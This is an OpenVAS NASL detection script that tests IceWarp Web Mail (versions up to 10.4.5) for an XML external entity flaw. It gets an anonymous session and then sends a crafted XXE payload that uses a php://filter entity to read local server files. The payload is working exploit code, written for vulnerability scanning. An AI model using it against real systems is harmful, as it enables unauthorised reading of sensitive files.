###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_icewarp_xxe_08_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# IceWarp Web Mail Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Attackers can exploit these issues to gain access to potentially
sensitive information.
Impact Level: System/Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103750";

tag_insight = "The used XML parser is resolving external XML entities which allows attackers 
to read files and send requests to systems on the internal network (e.g port 
scanning). The risk of this vulnerability is highly increased by the fact 
that it can be exploited by anonymous users without existing user accounts.";


tag_affected = "IceWarp Mail Server <=10.4.5";
tag_summary = "The remote IceWarp Web Mail is prone to an information-disclosure Vulnerability.";
tag_solution = "Vendor updates are available.";
tag_vuldetect = "Send a special crafted HTTP POST request and check the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:P");

 script_name("IceWarp Web Mail Information Disclosure Vulnerability.");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/icewarp-mail-server-1045-xss-xxe-injection");
 script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130625-0_IceWarp_Mail_Server_Multiple_Vulnerabilities_v10.txt");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-07 16:35:04 +0200 (Wed, 07 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80, 32000);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port(default:32000);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Server: IceWarp/" >!< banner)exit(0);

soc = open_sock_tcp(port, transport:get_port_transport(port));
if(!soc)exit(0);

host = get_host_name();

req = 'GET /rpc/gw.html HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n';
resp = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("Invalid XML request" >!< resp)exit(0);

xml = '<?xml version="1.0"?>
<methodCall>
  <methodName>LoginUser</methodName>
  <params>
    <param><value></value></param>
  </params>
</methodCall>';

len = strlen(xml);

req = 'POST /rpc/gw.html HTTP/1.1\r\n' + 
      'Host: ' + host + ':' + port + '\r\n' + 
      'Content-Type: text/xml\r\n' +
      'Content-Length: ' + len + '\r\n' + 
      '\r\n' + xml;

resp = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("<methodResponse>" >!< resp)exit(0);

sess = eregmatch(pattern:"<value>([^<]+)</value>", string:resp);
if(isnull(sess[1]) || strlen(sess[1]) < 1)exit(0);

session = sess[1];

files = traversal_files();

foreach file (keys(files)) {

  if(".ini" >< files[file])
    files[file] = 'c:/' + files[file];
  else
    files[file] = '/' + files[file];

  xml = '<?xml version="1.0"?>
<!DOCTYPE OpenVAS [<!ENTITY bar SYSTEM "php://filter/read=convert.base64-encode/resource=' + files[file]  + '">]>
<methodCall>
  <methodName>ConvertVersit</methodName>
  <params>
    <param><value>' + session + '</value></param>
    <param><value>OpenVAS;&bar;</value></param>
    <param><value>XML</value></param>
  </params>
</methodCall>';

  len = strlen(xml);

  req = 'POST /rpc/gw.html HTTP/1.1\r\n' +
        'Host: ' + host + ':' + port + '\r\n' +
        'Content-Type: text/xml\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' + xml;

  resp = http_send_recv(port:port, data:req, bodyonly:FALSE);

  resp = str_replace(string:resp, find:"&lt;", replace:"<");
  resp = str_replace(string:resp, find:"&gt;", replace:">");
  
  content = eregmatch(pattern:"<OPENVAS>([^<]+)</OPENVAS>", string: resp);

  if(isnull(content[1]))continue;

  ret = base64_decode(str:content[1]);

  if(ereg(pattern:file, string:ret)) {
    security_hole(port:port);
    exit(0);
  }

}

exit(0);
